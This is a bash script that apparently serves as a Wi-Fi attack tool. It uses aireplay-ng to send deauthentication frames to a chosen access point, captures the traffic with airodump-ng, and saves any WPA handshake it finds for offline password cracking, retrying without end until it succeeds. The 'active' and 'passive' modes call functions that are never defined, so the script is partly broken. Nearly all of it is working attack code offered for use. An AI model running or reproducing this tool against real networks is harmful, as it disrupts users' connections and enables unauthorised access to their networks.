#!/bin/bash

interface=""
channel=""
HANDSHAKE_PATH="."

checkHandshakes() {
        trap 'cleanup' EXIT
        printf "\n"
        echo "Check handshakes..."
        cleanout=$(wpaclean ./hscollector/cleancap.cap ./hscollector/shakes-01.cap)
        if [[ "$cleanout" == *"Net "* ]]; then
                output=$(cowpatty -c -r ./hscollector/cleancap.cap)
                if [[ "$output" != *"Try using a
different capture."* ]]; then
                        printf "\033[32mHandshakes detected!!!\033[0m\n"
                        time=$(date +%s)
                        filename="shake-$time"
                        if [[ -d ./hscollector/shakes ]]; then
                                mv ./hscollector/cleancap.cap $HANDSHAKE_PATH/handshake-$time
                        else
                                mkdir ./hscollector/shakes
                                chmod 777 -R $HANDSHAKE_PATH/shakes
                                mv ./hscollector/cleancap.cap $HANDSHAKE_PATH/handshake-$time
                        fi
                        cleanup
                        exit 0
                 else
                        printf "\033[31mNo handshakes\033[0m\n"
                        rm ./hscollector/cleancap.cap &>/dev/null
                 fi
        else 
                printf "\033[31mNo handshakes\033[0m\n"
                rm ./hscollector/cleancap.cap &>/dev/null
        fi
        rm cleancap.cap &> /dev/null
}

airodumpPID=""
attackSpecific(){
           #trap 'cleanup;' EXIT
           airmon-ng start $interface >/dev/null
           BSSID_SEARCH=$1
           CHANNEL=$2
           iwconfig $interface channel $CHANNEL
           aireplay-ng -a $BSSID_SEARCH -0 10 $interface &
           airodump-ng --output-format pcap --bssid $BSSID_SEARCH --channel $CHANNEL -w ./hscollector/shakes $interface 1>/dev/null 2>/dev/null 3>/dev/null &
           airodumpPID=`echo $!`
           sleep 15
           kill -9 $airodumpPID &> /dev/null
           checkHandshakes
           cleanup

           attackSpecific $1 $2
}

cleanup(){
        kill -9 $airodumpPID &> /dev/null

        rm ./hscollector/cleancap.cap &>/dev/null
        rm ./hscollector/shakes* &> /dev/null
}

#trap 'cleanup;exit 0' SIGINT SIGTERM ERR EXIT

if [[ "$(whoami)" != root ]]; then
  echo "Only user root can run this script."
  exit 1
fi


if [[ $1 != "" ]] && [[ $2 != "" ]];then
                interface=$1
                mkdir -p hscollector &> /dev/null
                cleanup
                airmon-ng start $interface >/dev/null

                if [[ $5 != "" ]];then
                        HANDSHAKE_PATH=$5
                        if [[ ! -d $5 ]]; then
                                echo "No such folder"
                                exit 1
                        fi

                fi
                if [[ $2 == "a" ]];then
                        active
                fi
                if [[ $2 == "p" ]];then
                        passive

                fi
                if [[ $2 == "s" ]];then
                        if [[ $3 == "" ]];then
                                channel=$4
                                echo "Enter BSSID of AP"
                                exit 1
                        fi
                        if [[ $4 == "" ]];then
                                channel=$4
                                echo "Enter channel of AP"
                                exit 1
                        fi

                        attackSpecific $3 $4 
                fi
                exit 0
fi
